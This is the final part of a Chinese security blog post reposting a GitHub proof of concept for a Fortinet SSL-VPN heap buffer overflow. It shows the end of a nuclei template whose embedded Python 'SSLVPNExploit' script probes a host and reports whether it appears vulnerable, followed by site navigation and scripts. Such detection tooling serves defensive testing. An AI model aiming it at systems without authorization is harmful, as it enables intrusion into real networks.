          <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">None</span><br><br>          except socket.timeout <span class="hljs-keyword">as</span> e:<br>            print(&quot;[&gt;] <span class="hljs-title class_ inherited__">Target</span> waited <span class="hljs-keyword">for</span> more data. <span class="hljs-title class_ inherited__">Not</span> vulnerable.&quot;)<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">False</span><br>          except <span class="hljs-title class_ inherited__">Exception</span> <span class="hljs-keyword">as</span> e:<br>            print(&quot;[&gt;] <span class="hljs-title class_ inherited__">Target</span> dropped the connection, which indicates a vulnerable device!&quot;)<br>            print(e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_ inherited__">True</span><br>      <span class="hljs-keyword">if</span> __name__ == &#x27;__main__&#x27;:<br>        host=os.getenv(&quot;<span class="hljs-title class_ inherited__">Host</span>&quot;)<br>        port=int(os.getenv(&quot;<span class="hljs-title class_ inherited__">Port</span>&quot;))<br>        exploit = <span class="hljs-title class_ inherited__">SSLVPNExploit</span>(host, port)<br>        check = exploit.check_by_get()<br>        <span class="hljs-keyword">if</span> check == <span class="hljs-title class_ inherited__">True</span>:<br>          result = exploit.is_vulnerable()<br>          <span class="hljs-keyword">if</span> result == <span class="hljs-title class_ inherited__">None</span>:<br>            print(&quot;[!] <span class="hljs-title class_ inherited__">An</span> error occurred testing <span class="hljs-keyword">for</span> the vulnerability.\n[!] <span class="hljs-title class_ inherited__">Is</span> this even a <span class="hljs-title class_ inherited__">FortiGate</span> <span class="hljs-title class_ inherited__">SSL</span>-<span class="hljs-title class_ inherited__">VPN</span>?&quot;)<br>            exit(2)<br>          <span class="hljs-keyword">if</span> result == <span class="hljs-title class_ inherited__">True</span>:<br>            print(&quot;[+] <span class="hljs-title class_ inherited__">Target</span> appears to be <span class="hljs-title class_ inherited__">VULNERABLE</span>&quot;)<br>            exit(0)<br>          <span class="hljs-keyword">else</span>:<br>            print(&quot;[+] <span class="hljs-title class_ inherited__">Target</span> <span class="hljs-keyword">is</span> <span class="hljs-title class_ inherited__">NOT</span> vulnerable&quot;)<br>            exit(1)<br>    matchers:<br>      - type: word<br>        words:<br>          - &quot;<span class="hljs-title class_ inherited__">Target</span> appears to be <span class="hljs-title class_ inherited__">VULNERABLE</span>&quot;<br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Github-Poc/" class="category-chain-item">Github Poc</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
+      
+        <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="print-no-link">#缓冲区溢出</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Fortinet SSL-VPN 堆缓冲区溢出漏洞</div>
+      <div>http://example.com/2025/06/11/github_1249466416/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lianccc</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/06/11/github_986013126/" title="WordPress Job Portal 不安全的直接对象引用 (IDOR) 漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">WordPress Job Portal 不安全的直接对象引用 (IDOR) 漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/11/github_1855608257/" title="Apache2 目录列表禁用漏洞">
+                        <span class="hidden-mobile">Apache2 目录列表禁用漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
